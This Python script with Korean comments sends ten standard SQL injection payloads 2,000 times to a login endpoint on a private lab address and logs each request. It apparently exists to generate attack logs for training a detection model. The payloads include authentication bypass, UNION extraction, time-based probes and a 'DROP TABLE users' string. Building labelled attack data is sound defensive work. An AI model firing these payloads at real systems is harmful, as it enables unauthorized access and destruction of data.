import requests
import datetime
import time
import random

# 1. 환경 설정
url = "http://192.168.2.100:5000/"
log_file = "sql_injection_bypassed.log"

# 2. 목표 수치: 2,000개 (10개 페이로드 * 200세트)
REPEAT_COUNT = 200

# AI 학습을 위한 다양한 SQL 인젝션 기법들
payloads = [
    {"username": "' OR '1'='1", "password": "1"},          # 무조건 참 (Auth Bypass)
    {"username": "admin' --", "password": "1"},            # 주석 처리 (Comment)
    {"username": "admin' #", "password": "1"},             # 주석 처리 (MySQL용)
    {"username": "' UNION SELECT 1, 'admin', '123' --", "password": "1"}, # 데이터 탈취 (UNION)
    {"username": "admin' AND 1=1 --", "password": "1"},    # 논리 검증 (True)
    {"username": "admin' AND 1=2 --", "password": "1"},    # 논리 검증 (False)
    {"username": "'; WAITFOR DELAY '0:0:5' --", "password": "1"}, # 시간 지연 (Time-based)
    {"username": "admin' OR 'a'='a", "password": "1"},     # 문자열 참값 확인
    {"username": "'; DROP TABLE users; --", "password": "1"}, # 데이터 파괴 시도
    {"username": "admin' AND (SELECT 1)=1 --", "password": "1"} # 서브쿼리 활용
]

def write_log(message: str) -> None:
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(message + "\n")

print(f"💀 [데이터 수집 시작] SQL 인젝션 (미탐): 총 {REPEAT_COUNT * 10}개 데이터를 생성합니다.")

# 3. 매크로 실행 엔진
for cycle in range(1, REPEAT_COUNT + 1):
    if cycle % 10 == 0:
        print(f"📡 현재 수집 상황: {cycle * 10} / 2000 건 전송 중...")
    
    for i, data in enumerate(payloads, start=1):
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            res = requests.post(
                url,
                json=data,
                timeout=3
            )

            # 로그에 어떤 페이로드가 들어갔는지 명확히 남깁니다.
            log_line = (
                f"{now} | SQLI_BYPASS | cycle={cycle} | "
                f"query={data['username']} | status={res.status_code}"
            )
            write_log(log_line)

        except requests.RequestException as e:
            log_line = f"{now} | SQLI_BYPASS | error={e}"
            write_log(log_line)

        # ⏱ 실제 해커처럼 약간의 딜레이 (0.1~0.3초 무작위)
        time.sleep(random.uniform(0.1, 0.3))

print(f"\n✨ 수집 완료! '{log_file}' 파일에서 험악한(?) 로그들을 확인해 보세요.")
